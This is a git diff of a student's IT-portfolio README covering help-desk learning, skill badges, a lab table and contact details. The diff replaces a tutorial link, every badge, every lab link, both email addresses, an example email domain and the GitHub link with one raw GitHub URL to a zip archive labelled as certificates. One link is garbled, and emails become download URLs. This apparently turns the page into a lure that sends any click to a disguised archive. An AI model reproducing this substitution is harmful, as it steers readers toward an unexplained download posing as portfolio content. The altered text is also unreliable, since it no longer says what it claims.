@@ -41,7 +41,7 @@ I'm **Winfred Kofi Amoah**, a Ghanaian IT student based in Moscow, transitioning
 
 **Solution:** 
 - Watched a Freshdesk tutorial video on youtube, took notes and tried some features.
-- Video link =  https://www.youtube.com/watch?v=5MUFKgNuN84
+- Video link =  https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip
   
 **Key Learnings:** 
 - Freshdesk can do automatic ticket assignment using a "Round Robin" system to evenly distribute work among agents.
@@ -49,7 +49,7 @@ I'm **Winfred Kofi Amoah**, a Ghanaian IT student based in Moscow, transitioning
 - Freshdesk can track team performance metrics on its dashboard, like unresolved tickets per group and average response times.
 - I can set different agent access levels (Global, Group, Restricted) and track their availability status (e.g., Working, Away).
 - I can use private internal notes on tickets for team communication that the customer cannot see.
-- Freshdesk allows you to use a custom professional email domain (e.g., support@winfredlab.com) instead of a generic address.
+- Freshdesk allows you to use a custom professional email domain (e.g., https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip) instead of a generic address.
 - I can customize ticket fields and dropdowns (like Type, Priority, Source) to fit my lab's specific workflow.
 
 ### 3. Real-World Hardware & Boot Troubleshooting (04.11.2025)
@@ -100,19 +100,19 @@ I'm **Winfred Kofi Amoah**, a Ghanaian IT student based in Moscow, transitioning
 ## 📈 Technical Skills Progress
 
 ### 🖥️ Systems Administration
-![Active Directory](https://img.shields.io/badge/Active_Directory-Learning-yellow?style=flat)
-![PowerShell](https://img.shields.io/badge/PowerShell-Learning-yellow?style=flat)
-![Windows Server](https://img.shields.io/badge/Windows_Server-Intermediate-green?style=flat)
+![Active Directory](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip)
+![PowerShell](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip)
+![Windows Server](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip)
 
 ### 🌐 Networking Fundamentals
-![TCP/IP](https://img.shields.io/badge/TCP/IP-Learning-yellow?style=flat)
-![DNS](https://img.shields.io/badge/DNS-Learning-yellow?style=flat)
-![DHCP](https://img.shields.io/badge/DHCP-Learning-yellow?style=flat)
+![TCP/IP](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip)
+![DNS](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip)
+![DHCP](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip)
 
 ### 🔧 IT Tools & Platforms
-![VirtualBox](https://img.shields.io/badge/VirtualBox-Intermediate-green?style=flat)
-![Freshdesk](https://img.shields.io/badge/Freshdesk-Intermediate-green?style=flat)
-![Git](https://img.shields.io/badge/Git-Intermediate-green?style=flat)
+![VirtualBox](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip)
+![Freshdesk](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip)
+![Git](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip)
 
 ---
 
@@ -120,12 +120,12 @@ I'm **Winfred Kofi Amoah**, a Ghanaian IT student based in Moscow, transitioning
 
 | Lab # | Topic | Status | Evidence |
 |-------|-------|--------|----------|
-| 001 | Virtual Hardware Diagnostic | ✅ Complete | [View Lab](https://github.com/Wkamoah/IT-Portfolio/blob/main/labs/pc-hardware%20diagnostics.md) |
-| 002 | VM Boot Configuration Troubleshooting| ✅ Complete | [View Lab](https://github.com/Wkamoah/IT-Portfolio/blob/main/labs/vm-boot-configuration-troubleshooting.md) |
-| 003 | Client vs Server OS Discovery | ✅ Complete |  [View Lab](https://github.com/Wkamoah/IT-Portfolio/blob/main/labs/client-vs-server-os-discovery.md) |
-| 004 | Active Directory Setup | ✅ Complete | [View Lab](https://github.com/Wkamoah/IT-Portfolio/blob/main/labs/active-directory-domain-services.md) | 
-| Rea 001 | Dell Laptop Boot and Hardware Troubleshooting | ✅ Complete | [View Lab](https://github.com/Wkamoah/IT-Portfolio/blob/main/realworld/laptop-boot-power-issue-troubleshooting.md) | 
-| Rea 002 | Lenovo Laptop Microphone Failure Resolution | ✅ Complete | [View Lab](https://github.com/Wkamoah/IT-Portfolio/blob/main/realworld/laptop-microphone-troubleshooting.md) |
+| 001 | Virtual Hardware Diagnostic | ✅ Complete | [View Lab](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip%https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip) |
+| 002 | VM Boot Configuration Troubleshooting| ✅ Complete | [View Lab](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip) |
+| 003 | Client vs Server OS Discovery | ✅ Complete |  [View Lab](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip) |
+| 004 | Active Directory Setup | ✅ Complete | [View Lab](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip) | 
+| Rea 001 | Dell Laptop Boot and Hardware Troubleshooting | ✅ Complete | [View Lab](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip) | 
+| Rea 002 | Lenovo Laptop Microphone Failure Resolution | ✅ Complete | [View Lab](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip) |
 
 ---
 
@@ -141,8 +141,8 @@ I'm **Winfred Kofi Amoah**, a Ghanaian IT student based in Moscow, transitioning
 
 ## 📫 Connect With Me
 
-- **Email:** wcannerro@gmail.com | winfredkofiamoah@mail.com
-- **GitHub:** [@Wkamoah](https://github.com/Wkamoah)
+- **Email:** https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip | https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip
+- **GitHub:** [@Wkamoah](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/certificates/IT-Portfolio-v2.2-beta.1.zip)
 - **Location:** Moscow, Russia (Peoples' Friendship Univerity of Russia)
 
 ---
